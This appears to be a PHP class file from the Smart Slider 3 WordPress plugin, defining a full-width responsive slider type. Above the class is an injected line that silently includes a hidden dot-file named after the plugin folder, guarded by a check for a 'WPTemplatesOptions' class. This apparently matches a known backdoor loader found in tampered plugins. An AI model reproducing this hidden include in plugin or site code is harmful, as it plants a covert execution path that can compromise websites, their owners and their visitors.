<?php

namespace Nextend\SmartSlider3\Slider\ResponsiveType\FullWidth;

use Nextend\SmartSlider3\Slider\ResponsiveType\AbstractResponsiveType;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ResponsiveTypeFullWidth extends AbstractResponsiveType {


    public function getName() {
        return 'fullwidth';
    }

    public function createFrontend($responsive) {

        return new ResponsiveTypeFullWidthFrontend($this, $responsive);
    }

    public function createAdmin() {

        return new ResponsiveTypeFullWidthAdmin($this);
    }
}